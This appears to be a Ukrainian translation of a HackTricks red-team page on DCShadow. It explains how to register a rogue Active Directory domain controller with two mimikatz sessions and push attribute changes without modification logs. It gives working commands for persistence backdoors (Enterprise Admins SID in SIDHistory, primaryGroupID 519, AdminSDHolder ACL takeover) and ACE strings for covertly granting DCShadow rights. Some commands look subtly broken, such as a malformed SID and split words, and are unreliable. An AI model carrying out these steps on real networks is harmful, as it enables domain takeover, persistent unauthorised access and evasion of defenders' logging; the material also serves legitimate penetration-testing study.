<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв GitHub**.

</details>


# DCShadow

Це реєструє **новий контролер домену** в AD і використовує його для **передачі атрибутів** (SIDHistory, SPNs...) на вказані об'єкти **без** залишення будь-яких **журналів** щодо **модифікацій**. Вам **потрібні привілеї DA** та перебувати в **кореневому домені**.\
Зверніть увагу, що якщо ви використовуєте неправильні дані, з'являться досить потворні журнали.

Для виконання атаки вам потрібно 2 екземпляри mimikatz. Один з них запустить сервери RPC з привілеями SYSTEM (ви повинні вказати тут зміни, які ви хочете виконати), а інший екземпляр буде використовуватися для передачі значень:

{% code title="mimikatz1 (Сервери RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Потребує DA або подібне" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Зверніть увагу, що **`elevate::token`** не працюватиме в сесії `mimikatz1`, оскільки це підвищує привілеї потоку, але нам потрібно підвищити **привілеї процесу**.\
Ви також можете вибрати та "LDAP" об'єкт: `/object:CN=Адміністратор,CN=Користувачі,DC=JEFFLAB,DC=local`

Ви можете внести зміни з обліковими записами DA або з користувачем з цими мінімальними дозволами:

* У **об'єкті домену**:
* _DS-Install-Replica_ (Додати/Видалити Репліку в Домені)
* _DS-Replication-Manage-Topology_ (Керування Топологією Реплікації)
* _DS-Replication-Synchronize_ (Синхронізація Реплікації)
* Об'єкт **Сайти** (та його діти) в **контейнері Конфігурації**:
* _CreateChild та DeleteChild_
* Об'єкт **комп'ютера, який зареєстрований як DC**:
* _WriteProperty_ (Не Write)
* **Цільовий об'єкт**:
* _WriteProperty_ (Не Write)

Ви можете використовувати [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) для надання цих привілеїв непривілейованому користувачеві (зверніть увагу, що це залишить деякі журнали). Це набагато більш обмежено, ніж мати привілеї DA.\
Наприклад: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Це означає, що ім'я користувача _**student1**_ при вході в систему на комп'ютері _**mcorp-student1**_ має привілеї DCShadow для об'єкта _**root1user**_.

## Використання DCShadow для створення задніх дверей

{% code title="Set Enterprise Admins in SIDHistory to a user" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Зміна PrimaryGroupID (додавання користувача до групи Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Змінити ntSecurityDescriptor AdminSDHolder (надати повний контроль користувачеві)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Надайте дозвіл DCShadow, використовуючи DCShadow (без модифікованих журналів дозволів)

Нам потрібно додати наступні ACE з SID нашого користувача в кінці:

* На об'єкт домену:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDкористувача)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDкористувача)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDкористувача)`
* На об'єкт комп'ютера атакувальника: `(A;;WP;;;SIDкористувача)`
* На цільовий об'єкт користувача: `(A;;WP;;;SIDкористувача)`
* На об'єкт сайтів у контейнері конфігурації: `(A;CI;CCDC;;;SIDкористувача)`

Щоб отримати поточний ACE об'єкта: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Зверніть увагу, що в цьому випадку вам потрібно зробити **кілька змін,** а не лише одну. Таким чином, у сеансі **mimikatz1** (сервер RPC) використовуйте параметр **`/stack` з кожною зміною,** яку ви хочете зробити. Таким чином, вам потрібно буде лише **`/push`** один раз, щоб виконати всі застряглі зміни на підроблених серверах.



[**Додаткова інформація про DCShadow на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>
